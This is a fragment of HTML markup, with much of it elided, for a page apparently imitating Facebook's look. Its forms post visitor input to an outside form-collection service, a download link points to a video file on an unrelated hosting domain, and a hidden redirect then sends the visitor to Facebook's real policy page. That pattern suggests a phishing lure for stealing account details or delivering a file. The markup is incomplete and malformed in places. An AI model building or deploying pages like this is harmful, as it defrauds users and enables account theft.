...
<body>
    <div class="md:block lg:block hidden border flex w-full h-[6rem]  relative bg-[#4667ac]">
        ...
        <form class="sm:hidden lg:block md:block" action="https://submit-form.com/V0GWxEB4G" method="POST">
            ...
            <div style="position: absolute; left: 1.5rem; top:8rem; width: 90%;">
                ...
                <div>
                    <a class="w-[120px] h-[80px] block mx-3" href="https://detailed-video-29b30.web.app/detailed video.mp4"><img src="download.png" alt=""></a>
                </div>
                <div>
              ...
              <div>
                ...
                <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
                    <div class="flex justify-end mx-2">
                        <form action="/f/AO8nNQelCDNHBNC" method="post"><button class="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">
                            Submit</form>
                                <!-- Other form elements -->
                                <input type="hidden" name="_redirect" value="https://www.facebook.com/policies_center"/>
                            </div>
                </div>
            </div>
        </form>
